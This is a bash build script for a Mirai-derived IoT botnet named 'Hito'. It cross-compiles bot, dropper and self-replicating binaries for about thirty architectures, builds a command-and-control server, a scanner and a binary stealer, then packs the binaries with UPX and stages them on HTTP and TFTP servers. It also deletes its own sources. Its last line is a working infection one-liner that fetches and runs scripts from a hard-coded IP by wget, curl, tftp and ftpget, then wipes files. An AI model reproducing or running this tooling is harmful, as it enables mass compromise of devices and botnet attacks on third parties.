#!/bin/bash
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin

export PATH=$PATH:/etc/xcompile/aarch64be/bin
export PATH=$PATH:/etc/xcompile/aarch64/bin
# export PATH=$PATH:/etc/xcompile/arcle-750d/bin
# export PATH=$PATH:/etc/xcompile/arcle-hs38/bin
export PATH=$PATH:/etc/xcompile/bfin/bin
export PATH=$PATH:/etc/xcompile/m68k-68xxx/bin
export PATH=$PATH:/etc/xcompile/m68k-coldfire/bin
export PATH=$PATH:/etc/xcompile/microblazebe/bin
export PATH=$PATH:/etc/xcompile/microblazeel/bin
export PATH=$PATH:/etc/xcompile/nios2/bin
export PATH=$PATH:/etc/xcompile/openrisc/bin
export PATH=$PATH:/etc/xcompile/riscv64/bin
export PATH=$PATH:/etc/xcompile/sh-sh4aeb/bin
export PATH=$PATH:/etc/xcompile/sh-sh4/bin
export PATH=$PATH:/etc/xcompile/x86-64-core-i7/bin
export PATH=$PATH:/etc/xcompile/x86-core2/bin
export PATH=$PATH:/etc/xcompile/x86-i686/bin
export PATH=$PATH:/etc/xcompile/xtensa-lx60/bin
export PATH=$PATH:/etc/xcompile/arc/bin
export PATH=$PATH:/etc/xcompile/alpha/bin
export PATH=$PATH:/etc/xcompile/mips64/bin

export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -lpthread -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function othercpu_bot {
    "$1-linux-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-linux-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

function arm7_compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -lpthread -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}
function honeyairdrop_bot {
    "$1-gcc" -std=c99 $3 botH/dropper/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeydrop_bot {
    "$1-gcc" -std=c99 $3 botH/dropper/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

function arc_compile {
    "$1-linux-gcc" -DMIRAI_BOT_ARCH="$3" -std=c99 bot/*.c -s -O3 -lpthread -o release/"$2"
}


rm -rf ~/release
mkdir ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/358835865482368
mkdir /var/www/html/358835865482368w482582
mkdir /var/www/html/358835865482368w4857w489rt9724
mkdir /var/www/html/bins
mkdir /var/www/html/3588358654823689823474932
mkdir /var/www/html/1234784525247
mkdir /var/www/html/3234572452482745274852478752745
mkdir /var/www/html/358835865482368213874324893192
mkdir /var/www/html/3erggggggggggggggggggggggggggggsdvfuisdfhifgu
mkdir /var/www/html/3245985245724857248957rgiujgjuesfrgiurwgh
mkdir /var/www/html/13747243572475
mkdir /var/www/html/swrgiuhguhwrguiwetu
mkdir /var/www/html/we7yr234r243
mkdir /var/www/html/98wertu2489wut4w98tu249857248952
mkdir /var/www/html/iswreuhftgwruifhw9834
go build -o loader/cnc cnc/*.go
rm -rf ~/cnc
mv ~/loader/cnc ~/

echo "Hito v3 private version" > mkdir /var/www/html/358835865482368/index.html
echo "Hito v3 private version" > mkdir /var/www/html/358835865482368w482582/index.html
echo "Hito v3 private version" > mkdir /var/www/html/358835865482368w4857w489rt9724/index.html
echo "Hito v3 private version" > mkdir /var/www/html/bins/index.html
echo "Hito v3 private version" > mkdir /var/www/html/3588358654823689823474932/index.html
echo "Hito v3 private version" > mkdir /var/www/html/1234784525247/index.html
echo "Hito v3 private version" > mkdir /var/www/html/3234572452482745274852478752745/index.html
echo "Hito v3 private version" > mkdir /var/www/html/358835865482368213874324893192/index.html
echo "Hito v3 private version" > mkdir /var/www/html/3erggggggggggggggggggggggggggggsdvfuisdfhifgu/index.html
echo "Hito v3 private version" > mkdir /var/www/html/3245985245724857248957rgiujgjuesfrgiurwgh/index.html
echo "Hito v3 private version" > mkdir /var/www/html/13747243572475/index.html
echo "Hito v3 private version" > mkdir /var/www/html/swrgiuhguhwrguiwetu/index.html

compile_bot i586 x86 "-static -DKILLER -DX86_64 -w" 
compile_bot mips mips "-static -DKILLER -w "
compile_bot mipsel mpsl "-static -DKILLER -w"
compile_bot armv4l arm "-static -DKILLER -w"
compile_bot armv5l arm5 "-DKILLER -w"
compile_bot armv6l arm6 "-static -DKILLER -w"
arm7_compile_bot armv7l arm7 "-static -DKILLER -w"
compile_bot powerpc ppc "-static -DKILLER -w"
compile_bot sparc spc "-static -DKILLER -w"
compile_bot m68k m68k "-static -DKILLER -w"
compile_bot sh4 sh4 "-static -DKILLER -w"
arc_compile arc arc "-static -DKILLER -w"
othercpu_bot i686 hx86_64 "-static -DKILLER -w"

compile_bot i586 tsm "-static -DKILLER -w" 

compile_bot armv4l jaws "-static -DKILLER -DJAWS -w"
compile_bot armv5l jaws5 "-DKILLER -DJAWS -w"
compile_bot armv6l jaws6 "-static -DKILLER -DJAWS -w"
arm7_compile_bot armv7l jaws7 "-static -DKILLER -DJAWS -w"
# BotH dropper
honeyairdrop_bot armv4l harm "-static -DKILLER -D BOT_ARCH=\"arm\""
honeyairdrop_bot armv5l harm5 "-static -DKILLER -D BOT_ARCH=\"arm5\""
honeyairdrop_bot armv6l harm6 "-static -DKILLER -D BOT_ARCH=\"arm6\""
honeyairdrop_bot armv7l harm7 "-static -DKILLER -D BOT_ARCH=\"arm7\""
honeyairdrop_bot mips hmips "-static -DKILLER -D BOT_ARCH=\"mips\""
honeyairdrop_bot mipsel hmpsl "-static -DKILLER -D BOT_ARCH=\"mpsl\""
honeyairdrop_bot sparc hspc "-static -DKILLER -D BOT_ARCH=\"spc\""
honeyairdrop_bot powerpc hppc "-static -DKILLER -D BOT_ARCH=\"ppc\""
honeyairdrop_bot m68k hm68k "-static -DKILLER -D BOT_ARCH=\"m68k\""
honeyairdrop_bot sh4 hsh4 "-static -DKILLER -D BOT_ARCH=\"sh4\""
honeyairdrop_bot i586 hx86 "-static -DKILLER -D BOT_ARCH=\"x86\""
honeyairdrop_bot arc harc "-static -DKILLER -D BOT_ARCH=\"arc\""


#honeyairdrop_bot i686 hx86_64 "-static -DKILLER -D BOT_ARCH=\"x86_64\""
#honeyairdrop_bot xtensa hxtensa "-static -DKILLER -D BOT_ARCH=\"xtensa\""
#honeyairdrop_bot aarch64 haarch64 "-static -DKILLER -D BOT_ARCH=\"aarch64\""
#honeyairdrop_bot nios2 hnios2 "-static -DKILLER -D BOT_ARCH=\"nios2\""
#honeyairdrop_bot or1k hor1k "-static -DKILLER -D BOT_ARCH=\"or1k\""
#honeyairdrop_bot bfin hbfin "-static -DKILLER -D BOT_ARCH=\"hbfin\""
#honeyairdrop_bot riscv64 hriscv64 "-static -DKILLER -D BOT_ARCH=\"riscv64\""

/etc/xcompile/xtensa-lx60/bin/xtensa-linux-gcc bot/*.c -o release/hxtensa -Dxtensa-lx60 -w
/etc/xcompile/x86-i686/bin/i686-linux-gcc bot/*.c -o release/x86_64 -Dx86_64 -w
/etc/xcompile/alpha/bin/alpha-linux-gcc bot/*.c -o release/halpha -Dalpha -w
/etc/xcompile/aarch64/bin/aarch64-linux-gcc bot/*.c -o release/haarch64 -Daarch64 -w
/etc/xcompile/bfin/bin/bfin-linux-gcc bot/*.c -o release/hbfin -Dbfin -w
/etc/xcompile/nios2/bin/nios2-linux-gcc bot/*.c -o release/hnios2 -Dnios2 -w
/etc/xcompile/openrisc/bin/or1k-linux-gcc bot/*.c -o release/hopenrisc -Dopenrisc -w
/etc/xcompile/riscv64/bin/riscv64-linux-gcc bot/*.c -o release/hriscv64 -Driscv64 -w


/etc/xcompile/alpha/bin/alpha-linux-gcc bot/*.c -o release/alpha -DALPHA -static -DKILLER -w
/etc/xcompile/mips64/bin/mips64-linux-gcc bot/*.c -o release/mips64 -DMIPS64 -static -DKILLER -w
/etc/xcompile/arcle-750d/bin/arc-linux-gcc bot/*.c -o release/arcle-750d -Darcle-750d -static -DKILLER -w
/etc/xcompile/arcle-hs38/bin/arc-linux-gcc bot/*.c -o release/arcle-hs38 -Darcle-hs38 -static -DKILLER -w
/etc/xcompile/microblazebe/bin/microblaze-linux-gcc bot/*.c -o release/microblazebe -Dmicroblazebe -static -DKILLER -w
/etc/xcompile/microblazeel/bin/microblazeel-linux-gcc bot/*.c -o release/microblazeel -Dmicroblazeel -static -DKILLER -w
/etc/xcompile/m68k-68xxx/bin/m68k-linux-gcc bot/*.c -o release/m68k-68xxx -Dm68k-68xxx -static -DKILLER -w
/etc/xcompile/m68k-coldfire/bin/m68k-linux-gcc bot/*.c -o release/m68k-coldfire -Dm68k-coldfire -static -DKILLER -w
/etc/xcompile/aarch64be/bin/aarch64_be-linux-gcc bot/*.c -o release/aarch64be -Daarch64be -static -DKILLER -w
/etc/xcompile/sh-sh4/bin/sh4-linux-gcc bot/*.c -o release/sh-sh4 -Dsh-sh4 -static -DKILLER -w

gcc -static -DKILLER -O3 -lpthread -pthread ~/loader/src/*.c -o ~/loader/loader

gcc -static -DKILLER -O3 -pthread -lpthread ~/selfrep/src/*.c -o ~/loader/selfrep

# Dlr droppers
armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.arm6
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.arm7
i586-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.x86
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.m68k
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.mpsl
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.ppc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.sh4
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.spc
echo "owo" > ~/dlr/release/dlr.arc
echo "owo" > ~/dlr/release/dlr.alpha
echo "owo" > ~/dlr/release/dlr.bfin
echo "owo" > ~/dlr/release/dlr.nios2
alpha-linux-gcc -Os -D BOT_ARCH=\"alpha\" -D ALPHA -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.alpha
mips64-linux-gcc -Os -D BOT_ARCH=\"mips64\" -D ALPHA -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.mips64
aarch64-linux-gcc -Os -D BOT_ARCH=\"aarch64\" -D aarch64 -Wl,--gc-sections -fdata-sections -ffunction-sections -e  -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.aarch64
aarch64_be-linux-gcc -Os -D BOT_ARCH=\"aarch64be\" -D aarch64be -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.aarch64be
arc-linux-gcc -Os -D BOT_ARCH=\"arcle-750d\" -D arcle-hs38 -Wl,--gc-sections -fdata-sections -ffunction-sections -e  -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.arcle-750d
bfin-linux-gcc -Os -D BOT_ARCH=\"bfin\" -D bfin -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.bfin
m68k-linux-gcc -Os -D BOT_ARCH=\"hm68k-68xxx\" -D m68k-68xxx -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.m68klinux
m68k-linux-gcc -Os -D BOT_ARCH=\"hm68k-coldfire\" -D m68k-coldfire -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.hm68k-coldfire
microblazeel-linux-gcc -Os -D BOT_ARCH=\"microblazebe\" -D microblazebe -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.microblazebe
microblazebe-linux-gcc -Os -D BOT_ARCH=\"microblazeel\" -D microblazeel -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.microblazeel
nios2-linux-gcc -Os -D BOT_ARCH=\"nios2\" -D nios2 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.nios2
or1k-linux-gcc -Os -D BOT_ARCH=\"or1k\" -D openrisc -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.or1k
riscv64-linux-gcc -Os -D BOT_ARCH=\"riscv64\" -D riscv64 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.riscv64
sh4-linux-gcc -Os -D BOT_ARCH=\"hsh-sh4\" -D sh-sh4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.hsh-sh4
x86_64-linux-gcc -Os -D BOT_ARCH=\"x86_64\" -D x86-core2 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.x86_64
i686-linux-gcc -Os -D BOT_ARCH=\"i686\" -D x86-i686 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.i686
xtensa-linux-gcc -Os -D BOT_ARCH=\"xtensa\" -D xtensa-lx60 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.xtensa
arc-linux-gcc -Os -D BOT_ARCH=\"arc\" -D arc -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static -DKILLER ~/dlr/main.c -o ~/dlr/release/dlr.arc
armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm5
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm6
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm7
i586-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.x86
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.m68k
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mpsl
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.ppc
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.sh4
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.spc
aarch64-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.aarch64
aarch64_be-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.aarch64be
arc-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arcle-750d
bfin-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.bfin
m68k-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.m68klinux
m68k-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.hm68k-coldfire
microblaze-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.hm68k-coldfire
microblazeel-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.microblazebe
nios2-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr2/release/dlr.nios2
or1k-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr2/release/dlr.or1k
riscv64-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr2/release/dlr.riscv64
sh4-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.hsh-sh4
x86_64-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.x86_64
i686-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.i686
xtensa-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.xtensa
arc-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arc
alpha-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr2/release/dlr.alpha
arc-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr2/release/dlr.arc

mv ~/dlr/release/dlr* ~/loader/bins
go build -o loader/scanListen scanListen.go
go build -o loader/binStealer binstealer.go
rm -rf ~/dlr ~/loader/src ~/bot ~/scanListen.go ~/Projects ~/build.sh ~/botH

cp ssh.sh /var/www/html/swrgiuhguhwrguiwetu

mv jawsiscool /var/www/html/swrgiuhguhwrguiwetu
mv sh /var/www/html/swrgiuhguhwrguiwetu


# Moving our new website >:3
cp index.html /var/www/html/swrgiuhguhwrguiwetu
mv css/ /var/www/html/swrgiuhguhwrguiwetu
mv img/ /var/www/html/swrgiuhguhwrguiwetu

cp index.html /var/www/html/13747243572475
mv css/ /var/www/html/13747243572475
mv img/ /var/www/html/13747243572475

echo "<center>*************************<br>Hito botnet <br>*************************</center>" >> /var/www/html/index.html
echo "<center>*************************<br>Hito botnet<br>*************************</center>" >> /var/www/html/index.html/swrgiuhguhwrguiwetu

cp release/h* /var/www/html/13747243572475

cp release/* /var/www/html/swrgiuhguhwrguiwetu
cp release/* /var/lib/tftpboot
rm -rf release

chmod 777 upx
./upx --ultra-brute /var/www/html/13747243572475/*
./upx --ultra-brute /var/www/html/*
./upx --ultra-brute /var/lib/tftpboot/*
./upx --ultra-brute /var/www/html/swrgiuhguhwrguiwetu/*

rm -rf upx*
rm -rf installs.sh
rm -rf tftp.py 
rm -rf loader2
rm -rf enc.c
rm -rf build_payload.py
rm -rf installs.sh
rm -rf loader_build.sh
rm -rf cncold/
rm -rf dlr2
rm -rf img
rm -rf css
rm -rf zte.go
rm -rf ssh.sh
rm -rf senc.c
rm -rf bot_build.sh
rm -rf drop_build.sh
rm -rf cncbrokeb
rm -rf binstealer.go
rm -rf selfrep
rm -rf index.html

python tftp.py
python build_payload.py


echo "payload = cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.200/swrgiuhguhwrguiwetu/ssh.sh; curl -O http://185.244.25.200/ssh.sh; chmod 777 ssh.sh; sh ssh.sh; tftp 185.244.25.200 -c get ssh.sh; chmod 777 ssh.sh; sh bin; tftp -r ssh2 -g 185.244.25.200; chmod 777 bin2; sh bin2; ftpget -v -u anonymous -p anonymous -P 21 185.244.25.200 bin1 bin1; sh bin1; rm -rf ssh.sh ssh.sh ssh.sh2 ssh.sh1; rm -rf *"



# serverip=$(ip addr show |grep 'inet '|grep -v 127.0.0.1 |awk '{print $2}'| cut -d/ -f1)